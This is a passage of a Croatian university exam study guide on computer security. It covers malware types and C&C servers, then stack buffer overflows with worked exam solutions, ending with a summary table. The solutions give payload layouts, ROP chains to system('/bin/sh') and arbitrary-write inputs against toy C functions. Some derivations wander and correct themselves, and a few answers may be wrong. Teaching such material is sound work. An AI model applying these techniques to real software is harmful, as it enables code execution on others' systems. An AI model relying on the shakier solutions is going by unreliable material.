**NE.** Crv se širi SAMOSTALNO mrežom. Guloader se širi tako da korisnik SAM otvori zaraženi Word dokument (phishing). To je širenje putem SOCIJALNOG INŽENJERINGA, ne automatskog mrežnog skeniranja. Guloader je bliži trojancu ili dropper-u.

**b) Kakvu ulogu ima 185.163.47.168?**
To je **C&C (Command and Control) poslužitelj**. NetWire-RAT ga kontaktira svakih 10 minuta, dobije PowerShell skriptu i izvrši je. Napadač preko njega kontrolira zaražena računala.

**c) Je li NetWire-RAT trojanac?**
**NE u strogom smislu.** Trojanac se MASKIRA kao koristan program — korisnik ga sam instalira misleći da je nešto dobro. NetWire-RAT se instalira tajno u pozadini (Guloader ga preuzima bez znanja korisnika). RAT je jednostavno vrsta zloćudnog tereta, ne trojanac po načinu širenja.

### Zadatak 2 (Ispit 2021/2022 — Zloćudni kod)
**Zloćudni kod skenira mrežu, širi se, šifrira dokumente, komunicira s adresom:**
- a) Vrsta po širenju: **crv** (širi se sam mrežom, skenira lokalnu mrežu)
- b) Vrsta po teretu: **ransomware** (šifrira dokumente)
- c) IP adresa: **C&C (Command & Control) poslužitelj**
- d) Grupa napadača: **kibernetički kriminalci** (ransomware = financijska motivacija)

---

# POGLAVLJE 12: Preljev spremnika na stogu (Buffer Overflow) ⭐⭐⭐

> **NAJTEŽI I NAJVIŠE BODNO VREDNOVAN ZADATAK NA ISPITU!** 6-7 bodova, pojavljuje se na SVAKOM ispitu. Uloži ekstra vrijeme ovdje!

## 12.1 Teorija

### Kako funkcionira memorija programa

Kada se program izvršava, koristi RAM memoriju organiziranu u segmente:

```
VISOKE ADRESE (npr. 0x7FFFFFFFFFFF)
┌──────────────────┐
│       STOG        │  ← raste PREMA DOLJE (prema nižim adresama)
│    (Stack)        │
│         ↓         │
│                   │
│         ↑         │
│    HRPA (Heap)    │  ← raste prema gore
├──────────────────┤
│   Globalne var.   │
├──────────────────┤
│   Kod programa    │  ← instrukcije
└──────────────────┘
NISKE ADRESE (npr. 0x000000400000)
```

### Funkcijski stog (Call Stack)

Svaki put kad se pozove funkcija, na stog se stavljaju:
1. **Argumenti funkcije** (ako ih ima)
2. **Adresa za povratak** (return address) — kamo se vratiti kad funkcija završi
3. **Spremljeni stari RBP** (base pointer) — pokazivač na prethodni okvir stoga
4. **Lokalne varijable** — prostor za varijable deklarirane u funkciji

**Izgled stoga za jednu funkciju (Linux x86-64):**
```
VIŠE ADRESE (dno stoga)
┌──────────────────────────┐
│    argumenti (ako ih ima) │
├──────────────────────────┤
│    adresa za povratak     │  ← OVDJE napadač želi pisati!
├──────────────────────────┤
│    spremljeni stari RBP   │
├──────────────────────────┤
│    lokalna varijabla 1    │
│    lokalna varijabla 2    │
│    ...                    │
│    lokalna varijabla N    │  ← $RSP (vrh stoga)
└──────────────────────────┘
NIŽE ADRESE (vrh stoga)
```

**Stog raste PREMA DOLJE** (prema nižim adresama), ali pisanje u niz (buffer) ide **PREMA GORE** (prema višim adresama). Zato kad prepuniš buffer, pišeš PREKO lokanih varijabli, starog RBP-a i ADRESE ZA POVRATAK!

### Little-endian zapis

x86-64 koristi **little-endian**: najniži bajt (least significant) je na najnižoj adresi.

Primjer: Vrijednost `0x0000000040253c` u memoriji:
```
Adresa:  +0   +1   +2   +3   +4   +5   +6   +7
Bajt:    3c   25   40   00   00   00   00   00
```
Najmanji bajt (3c) je na najnižoj adresi!

### Što je buffer overflow?

Buffer overflow = napadač upiše VIŠE podataka nego što buffer (niz) može primiti. Višak podataka "prelije" se preko granica buffera i prepiše susjedne memorijske lokacije.

```
NORMALNO:                    PRELJEV:
┌──────────┐                 ┌──────────┐
│  buffer   │ ← ispunjen     │  buffer   │ ← ispunjen
├──────────┤                 ├──────────┤
│  stari RBP│ ← netaknut     │ AAAAAAA  │ ← prepisan!
├──────────┤                 ├──────────┤
│  ret addr │ ← netaknut     │ NAPADAČ  │ ← prepisan adresom napadača!
└──────────┘                 └──────────┘
```

### Cilj napadača

Prepisati **adresu za povratak** tako da kad funkcija završi (ret instrukcija), program skoči na adresu po napadačevom izboru:
- Adresa funkcije `system("/bin/sh")` → otvori ljusku s admin ovlastima
- Adresa shellcode-a → izvrši proizvoljni kod

### Zaštitni mehanizmi

| Zaštita | Što radi | Kako utječe na napad |
|---------|----------|---------------------|
| **Write-XOR-Execute (W^X)** | Memorija je ili zapisiva ILI izvršiva, nikad oboje | Ne možeš izvršiti shellcode koji napišeš na stog |
| **ASLR** | Randomizira adrese stoga, heap-a, biblioteka pri svakom pokretanju | Ne znaš adresu za povratak unaprijed |
| **Kanarinci (Canaries)** | Tajni slučajni broj između lokalnih varijabli i adrese za povratak | Ako se kanarinac promijeni → program se prekida |

### ROP (Return-Oriented Programming)

Kad je W^X uključen, ne možeš staviti shellcode na stog. ALI možeš:
1. Naći **gadgete** — kratke sekvence instrukcija u kodu programa koje završavaju s `ret`
2. Staviti adrese gadgeta na stog umjesto adrese za povratak
3. Svaki `ret` skače na sljedeći gadget → "lanac" koji radi ono što želiš

### Pop i Ret instrukcije

```asm
pop rdi     ; uzmi 8 bajtova s vrha stoga, stavi u registar rdi, rsp += 8
pop rsi     ; uzmi 8 bajtova s vrha stoga, stavi u registar rsi, rsp += 8
ret         ; uzmi 8 bajtova s vrha stoga, skoči na tu adresu
```

### Scanf i Gets — zašto su opasni

- `gets(buffer)` — čita znakove dok ne naiđe na `\n`, NEMA provjere veličine → klasični buffer overflow
- `scanf("%s", buffer)` — čita do razmaka, NEMA provjere veličine → buffer overflow
- `scanf("%d", &n)` — čita broj, ne uzrokuje overflow sam po sebi, ali može dovesti do logičkih grešaka

## 12.2 Riješeni zadaci

### Zadatak 1 (Ispit 2023 — say_hello, 7 bodova)

**Kod:**
```c
void say_hello() {
    char name[32];
    printf("Enter name: ");
    gets(name);
    printf("Hello %s!\n", name);
}
```

**Stog:**
```
0x00007fffffffdec0  name[0-7]    "mr ander"
0x00007fffffffdec8  name[8-15]   "son\0..."
0x00007fffffffded0  name[16-23]  (ostatak buffera)
0x00007fffffffded8  name[24-31]  (ostatak buffera)
0x00007fffffffdee0  stari RBP    0x00007fffffffdef0
0x00007fffffffdee8  RET adresa   0x0000555555555lca
```

Buffer name ima 32 bajta (adrese dec0 do dedf), zatim 8 bajtova za stari RBP (dee0), pa 8 bajtova za adresu za povratak (dee8).

**Za prepisati RET adresu treba 32 + 8 = 40 bajtova smeća, pa onda 8 bajtova nove adrese.**

**a) Zašto shellcode ne uspijeva? (W^X je uključen)**
Write-XOR-Execute zaštita znači da je stog ZAPISIV ali NIJE IZVRŠIV. Shellcode se sprema na stog (jer ga gets() piše tamo), ali CPU odbija izvršiti kod sa stoga. Dakle, napadač ne može izvršiti shellcode na stogu.

**b) Napad sa system() (adresa: 0x00007ffff7c50d60):**

Treba 40 bajtova punjenja + adresa system():
```
Ulaz: AAAA AAAA AAAA AAAA AAAA AAAA AAAA AAAA AAAA AAAA [adresa system]
      |<---------- 40 bajtova punjenja ---------->|  |<-- 8 bajtova -->|
```

U heksadecimalnom: 40 × 0x41 (slovo 'A'), zatim adresa u little-endian:
```
0x00007ffff7c50d60 → bajtovi: 60 0d c5 f7 ff 7f 00 00
```

**PAŽNJA:** Ne smijemo koristiti bajtove 0x00 u sredini jer gets() prestaje čitati na nul-bajtu! Ali 0x00 na kraju je OK jer gets() sam dodaje \0.

Problem: Adresa 0x00007ffff7c50d60 sadrži 0x00 bajtove... ali ti bajtovi su na KRAJU (viši bajtovi), a little-endian stavlja niže bajtove prvi: `60 0d c5 f7 ff 7f 00 00`. Bajtovi 00 su na kraju — gets() ih neće pročitati, ali memorija na tom mjestu je ionako bila 0x00, pa neće smetati.

Stog nakon napada:
```
0x00007fffffffdec0  0x4141414141414141  AAAAAAAA
0x00007fffffffdec8  0x4141414141414141  AAAAAAAA
0x00007fffffffded0  0x4141414141414141  AAAAAAAA
0x00007fffffffded8  0x4141414141414141  AAAAAAAA
0x00007fffffffdee0  0x4141414141414141  AAAAAAAA (prepisani stari RBP)
0x00007fffffffdee8  0x00007ffff7c50d60  adresa system() (RET)
```

**c) Kanarinci:**
Kanarinac je slučajan broj koji se stavlja IZMEĐU lokalnih varijabli i starog RBP/adrese za povratak:
```
0x00007fffffffdec0  name[0-7]
...
0x00007fffffffded8  name[24-31]
0x00007fffffffdee0  KANARINAC (slučajna vrijednost)  ← NOVO!
0x00007fffffffdee8  stari RBP
0x00007fffffffdef0  RET adresa
```

Prije povratka iz funkcije, program provjerava kanarinac. Ako je promijenjen → napad detektiran → program se prekida!

**Je li napad iz b) još moguć s kanarincima?** NE, osim ako napadač nekako sazna vrijednost kanarinca. Da bi prepisao RET adresu, MORA prepisati i kanarinca. Ali ne zna njegovu vrijednost → detekcija.

**d) Napad s ROP gadgetom (pop rdi; ret na adresi 0x00007ffff7c3adc1):**

Za poziv `system("/bin/sh")` trebamo:
1. Staviti adresu stringa "/bin/sh" u registar rdi
2. Pozvati system()

Gadget na adresi `0x00007ffff7c3adc1`:
```
pop rdi     ; rdi = [vrh stoga], rsp += 8
pop rsi     ; rsi = [vrh stoga], rsp += 8 (ne koristimo, ali moramo popuniti)
pop r14     ; r14 = [vrh stoga], rsp += 8 (ne koristimo)
ret         ; skoči na [vrh stoga]
```

Treba: 40 bajtova smeća + adresa gadgeta + adresa_stringa_bin_sh + smeće za rsi + smeće za r14 + adresa system()

ALI — trebamo adresu na kojoj se nalazi string "/bin/sh". Napadač mora to pronaći u memoriji programa (npr. u libc-u).

Stog:
```
dee8: adresa gadgeta (pop rdi; pop rsi; pop r14; ret)
def0: adresa "/bin/sh"      ← pop rdi uzima ovo
def8: 0x0000000000000000     ← pop rsi uzima ovo (smeće)
df00: 0x0000000000000000     ← pop r14 uzima ovo (smeće)
df08: adresa system()        ← ret skoči ovamo
```

### Zadatak 2 (Ispit 2021/2022 — check_admin_password, 6 bodova)

**Kod:**
```c
void check_admin_password() {
    char entered_password[16];
    char admin_password[16];
    printf("Enter password: ");
    scanf("%s", entered_password);
    load_admin_password(admin_password);
    if (!strcmp(admin_password, entered_password))
        login_success();
}
```

**Stog:**
```
0x00007fffffffd900  admin_password[0-7]    "pass\0\0\0\0"
0x00007fffffffd908  admin_password[8-15]   "\0\0\0\0\0\0\0\0"
0x00007fffffffd910  entered_password[0-7]  "mrkva\0\0\0"
0x00007fffffffd918  entered_password[8-15] "\0\0\0\0\0\0\0\0"
0x00007fffffffd920  stari RBP              0x00007fffffffd930
0x00007fffffffd928  RET adresa             0x00000000004012bb
```

Adresa login_success: `0x000000000040253c`

**VAŽNO:** entered_password je na NIŽIM adresama od admin_password, ali scanf piše od entered_password PREMA GORE → prepišeš i admin_password i stari RBP i RET adresu!

Zapravo, pričekaj — pogledajmo raspored: admin_password je na d900, entered_password na d910. Stog raste prema dolje, pa je entered_password deklariran NAKON admin_password → entered_password je na NIŽIM adresama? NE — u ovom primjeru admin_password je na d900 (niže), entered_password na d910 (više).

Hmm, zapravo je kasnija varijabla na nižoj adresi: admin_password deklariran prije, entered_password poslije. "Kasnije deklarirane varijable na nižim adresama" — ali u ovom primjeru izgleda da je admin_password na nižoj adresi. Pogledajmo stog:

entered_password počinje na d910, admin_password na d900. entered_password je na VIŠOJ adresi. Kad scanf piše u entered_password, piše od d910 prema gore: d910, d911, ... Kad dođe do d920, prepiše stari RBP. Kad dođe do d928, prepiše RET adresu.

**a) Napad — poziv login_success:**
Trebamo prepisati od entered_password (d910) do RET adrese (d928):
- 16 bajtova entered_password (d910-d91f)
- 8 bajtova stari RBP (d920-d927)
- 8 bajtova za RET adresu = login_success

Ukupno: 24 bajta smeća + 8 bajtova adrese.

PAŽNJA: scanf("%s") prestaje čitati na razmaku i nul-bajtu. Dakle smeće ne smije sadržavati 0x00 ni razmake!

```
Ulaz: AAAAAAAAAAAAAAAAAAAAAAAA\x3c\x25\x40
      |<--- 24 bajta smeća --->||<-adresa->|
```

Little-endian: 0x40253c → bajtovi: 3c 25 40 (ostali bajtovi su 00 — scanf ih ne piše, ali memorija je već bila 00)

Stog nakon napada:
```
0x00007fffffffd910  0x4141414141414141  AAAAAAAA
0x00007fffffffd918  0x4141414141414141  AAAAAAAA
0x00007fffffffd920  0x4141414141414141  AAAAAAAA (stari RBP prepisan)
0x00007fffffffd928  0x000000000040253c  login_success!
```

**b) Obrana kanarincima:**
Kanarinac bi bio između lokalnih varijabli i starog RBP. Napadač mora prepisati kanarinac da bi došao do RET adrese → kanarinac se mijenja → program detektira napad i prekida izvršavanje. **Napad iz a) NIJE moguć s kanarincima.**

**c) Popravak koda:**
Zamijeniti `scanf("%s", entered_password)` s `scanf("%15s", entered_password)` — ograničiti unos na 15 znakova (+ nul-terminator = 16 ukupno). Ili koristiti `fgets(entered_password, 16, stdin)`.

### Zadatak 3 (Ispit 2025 — read_input, 7 bodova)

**Kod:**
```c
void read_input() {
    int i;
    int index;
    int value;
    int seq[5];
    for (i = 0; i < 2; i++) {
        scanf("%d %x", &index, &value);
        seq[index] = value;
    }
}
```

**Stog (nakon ulaza "0 baba 1 -1"):**
```
0x00007fffffffdb90  seq[0-1]     0xffffffff0000baba  ← $rsp
0x00007fffffffdb98  seq[2-3]     0x0000000000000000
0x00007fffffffdba0  seq[4]/value 0xffffffff00000000
0x00007fffffffdba8  index/i      0x0000000200000001
0x00007fffffffdbb0  stari RBP    0x00007fffffffdbc0  ← $rbp
0x00007fffffffdbb8  RET adresa   0x00006666666661a9
```

Adrese varijabli:
- seq: 0x7fffffffdb90 (20 bajtova = 5 int-ova × 4 bajta)
- value: 0x7fffffffdba4
- index: 0x7fffffffdba8
- i: 0x7fffffffdbac

**Ključni uvid:** `seq[index] = value` — napadač KONTROLIRA index! Ako stavi index > 4, piše IZVAN niza seq! Ovo je **arbitrary write** — napadač može pisati na BILO KOJU lokaciju na stogu!

Svaki element seq je int (4 bajta). seq[0] je na adresi db90, seq[1] na db94, seq[2] na db98, itd.
- seq[5] = db90 + 5×4 = db90 + 0x14 = dba4 → to je `value`!
- seq[6] = dba8 → to je `index`!
- seq[7] = dbac → to je `i`!
- seq[8] = dbb0 → stari RBP (donji 4 bajta)
- seq[9] = dbb4 → stari RBP (gornji 4 bajta)
- seq[10] = dbb8 → RET adresa (donji 4 bajta)
- seq[11] = dbbc → RET adresa (gornji 4 bajta)

**a) Napad — poziv system() (adresa: 0x7ffff7c58750), s W^X:**

Trebamo prepisati RET adresu (dbb8-dbbf). RET adresa zauzima 8 bajtova = dva int-a.

Donji 4 bajta: seq[10] na adresi dbb8 → index=10, value=0xf7c58750 (donji 4 bajta adrese system)
Gornji 4 bajta: seq[11] na adresi dbbc → index=11, value=0x00007fff (gornji 4 bajta)

ALI — petlja ide samo 2 puta! Trebamo oba upisa.

Ulaz: `10 f7c58750 11 7fff`

Stog nakon:
```
0x00007fffffffdbb8  0x00007ffff7c58750  ← RET = adresa system()
```

**b) Petlja se izvede 5 puta umjesto 2:**

Varijabla `i` je na adresi dbac = seq[7]. Ako postavimo `i` na negativnu vrijednost (ili malu vrijednost), petlja se nastavlja!

Ulaz: `7 0 7 0` — svaki put postavi seq[7] = i = 0, pa se petlja resetira. Ali to je beskonačna petlja...

Bolje: prvi unos postavi i na 0 ili neku malu vrijednost. Npr:
```
7 fffffffd 0 baba
```
Ovo postavlja seq[7] (= i) na 0xfffffffd = -3 (signed int). Petlja: for(i=-3; i<2; ...) → 5 iteracija (-3, -2, -1, 0, 1).

Ali pazi — ovo se izvršava u PRVOJ iteraciji! U drugoj iteraciji i je opet 1 (jer je i++ već izvršen). Treba razmisliti o redoslijedu...

Zapravo: u prvoj iteraciji (i=0): scanf čita index=7, value=0xfffffffe → seq[7] = i = 0xfffffffe = -2. Na kraju iteracije: i++ → i=-1. Provjera: -1<2 → da, nastavlja. Sad imamo 2. iteraciju (i=-1): normalan unos. i++ → i=0. 3. iteracija (i=0), 4. iteracija (i=1). Ukupno: 4 iteracije (0, -1, 0, 1) — to je 4 a ne 5.

Za 5 iteracija: postavi i na -3 → ali i++ se prvo izvrši → i = -3+1 = -2. Zatim -2<2 → da. Iteracije: i=0 (postavi na -3), zatim i=-2, -1, 0, 1. To je 5 ukupno!

Ulaz: `7 fffffffd 0 0` (prva iteracija: index=7 value=0xfffffffd postavi i=-3, druga iteracija počinje s i=-2)

**c) Gadget napad (gadget na 0x555555557fd0 koji postavlja rdi na "/bin/sh" i radi ret):**

Trebamo: RET → gadget → system()

Dva koraka za RET adresu:
1. seq[10] = donji 4 bajta gadgeta = 0x55557fd0
2. seq[11] = gornji 4 bajta gadgeta = 0x00005555

Ali i adresa system() mora biti na stogu nakon gadgeta (jer gadget završava s ret).

RET+8 je na adresi dbc0 → seq[12] i seq[13].

Problem: petlja ide samo 2 puta, a trebamo 4 upisa (seq[10], seq[11], seq[12], seq[13]).

Rješenje: u prvom prolazu postavimo i na malu vrijednost da dobijemo više iteracija, a u ostalim prolazima pišemo adrese.

Ulaz:
```
7 fffffffc 10 55557fd0
```
Iteracija 0: i=0, postavi seq[7]=i=0xfffffffc=-4, i++ → i=-3
Iteracija 1: i=-3, postavi seq[10]=0x55557fd0, i++ → i=-2
Sad treba nastaviti...
```
11 5555 12 f7c58750
```
Iteracija 2: i=-2, postavi seq[11]=0x00005555, i++ → i=-1
Iteracija 3: i=-1, postavi seq[12]=0xf7c58750, i++ → i=0

Trebamo i seq[13]=0x00007fff:
```
13 7fff 0 0
```
Iteracija 4: i=0, postavi seq[13]=0x00007fff, i++ → i=1
Iteracija 5: i=1, postavi seq[0]=0 (nebitno), i++ → i=2, 2<2 false → kraj

Ukupni ulaz: `7 fffffffc 10 55557fd0 11 5555 12 f7c58750 13 7fff 0 0`

Stog:
```
dbb8: 0x0000555555557fd0  ← RET = adresa gadgeta (pop rdi; ...; ret)
dbc0: 0x00007ffff7c58750  ← gadget radi ret → skoči na system()
```

Hmm, zapravo gadget radi pop rdi koji čita s vrha stoga, pa moramo staviti adresu "/bin/sh" za pop rdi. Ali zadatak kaže da gadget SAM postavlja rdi na "/bin/sh" i završava s ret — dakle ne treba staviti "/bin/sh" na stog. Samo treba:

```
dbb8: adresa gadgeta (postavi rdi="/bin/sh", ret)
dbc0: adresa system()
```

Dakle trebamo 4 upisa: seq[10], seq[11], seq[12], seq[13]. To je 4 iteracije za same adrese + 1 za promjenu i = 5+1 iteracija minimalno.

Ulaz: `7 fffffffc 10 55557fd0 11 5555 12 f7c58750 13 7fff 0 0`

**d) Shellcode napad (bez W^X):**

Bez W^X, stog je IZVRŠIV. Napadač može:
1. Pisati shellcode na stog (u seq niz)
2. Postaviti RET adresu na početak shellcode-a (= adresa seq = 0x7fffffffdb90)

Shellcode je 64 bajta = 16 int-ova. Napadač mora:
1. Proširiti petlju (postaviti i na malu vrijednost)
2. Upisati shellcode u seq[0] do seq[15] (64 bajta)
3. Upisati adresu db90 u seq[10] i seq[11]

**e) Kako zaključiti da nema kanarinca?**
Iz stoga vidimo da NEMA kanarinčeve vrijednosti između lokalnih varijabli i starog RBP/RET adrese. Da su kanarinci uključeni, vidjeli bismo dodatnu vrijednost na stogu.

**f) Bi li kanarinac spriječio napad iz d)?**
**NE nužno!** Jer napadač koristi `seq[index] = value` koji piše na PROIZVOLJNU lokaciju. Napadač može PRESKOČITI kanarinac — piše direktno na RET adresu bez da dira kanarinac! (seq[10] = RET adresa, bez diranja seq[8] i seq[9] gdje bi bio kanarinac). Dakle, napad je moguć i s kanarincima!

### Zadatak 4 (Vježbe 2021 — procitaj_niz, off-by-one)

**Kod:**
```c
void procitaj_niz() {
    int i;
    int n;
    int niz[10];
    printf("Upisite broj elemenata niza: ");
    scanf("%d", &n);
    if (n > 10) { printf("Previse!"); return; }
    for (i=0; i<=n; i++)     // ← BUG: <= umjesto <
        scanf("%d", &niz[i]);
    for (i=0; i<=n; i++)
        printf("%d\n", niz[i]);
}
```

**Off-by-one greška:** `i<=n` umjesto `i<n` → piše JEDAN element više nego što niz može primiti!

Ako n=10: petlja ide 0,1,...,10 = 11 elemenata, ali niz ima samo 10 mjesta (niz[0] do niz[9]).
niz[10] piše IZVAN niza → prepisuje `n` (jer n je na višoj adresi od niz, deklariran ranije).

**a) Napad s W^X i ASLR (čitanje memorije stoga):**
Postavimo n=10, zatim za niz[10] upišemo VELIKU vrijednost za n (npr. 100000). Sad je n=100000. Sljedeća petlja (ispis) radi `for(i=0; i<=100000; i++) printf(niz[i])` → ispisuje SVE sa stoga, uključujući adrese za povratak, stare RBP-ove itd. — curenje memorije!

**b) Napad bez W^X i ASLR (izvršenje koda):**
Koristimo istu off-by-one grešku da prepišemo n na veliku vrijednost, zatim pišemo dalje po stogu (shellcode + adresa za povratak).

**c) Obrana kanarincima:**
Kanarinac detektira linearan overflow — napadač mora prepisati kanarinac da bi došao do RET adrese. Ako se kanarinac promijeni → program se prekida.

---

# SAŽETAK — Najčešća pitanja i brzi odgovori

| Pitanje | Odgovor |
|---------|---------|
| Tri sigurnosna zahtjeva? | Povjerljivost, integritet, raspoloživost |
| AES pruža integritet? | **NE** |
| AES pruža savršenu povjerljivost? | **NE** |
| Jednokratna bilježnica pruža? | Samo savršenu povjerljivost |
| Kerckhoffsov princip? | Sigurnost ovisi o ključu, NE o tajnosti algoritma |
| Fail securely? | Kod pada → pretpostavi NESIGURAN ishod |
| RSA enkripcija formula? | c = m^e mod N |
| RSA potpis formula? | s = (P(H(m)))^d mod N |
| Digitalna omotnica? | AES za poruku + RSA za ključ |
| HMAC vs SHA256? | HMAC koristi ključ → pruža integritet; SHA256 ne |
| HTTPOnly kolačić? | Sprječava JS pristup (ne HTTPS — to je Secure flag) |
| W^X zaštita? | Stog nije izvršiv → shellcode na stogu ne radi |
| Kanarinci? | Detektiraju linearni overflow, ALI ne arbitrary write |
| CBC napad na kolačić? | Modificiraj IV: iv' = iv XOR stari_tekst XOR novi_tekst |
| CTR napad na kolačić? | c' = c XOR stari_tekst XOR novi_tekst |
| SQL injection obrana? | Prepared statements (pripremljene izjave) |
| Tko potpisuje certifikat? | PRIVATNI ključ IZDAVAČA (CA) |

---

**Sretno na ispitu! 🎓**
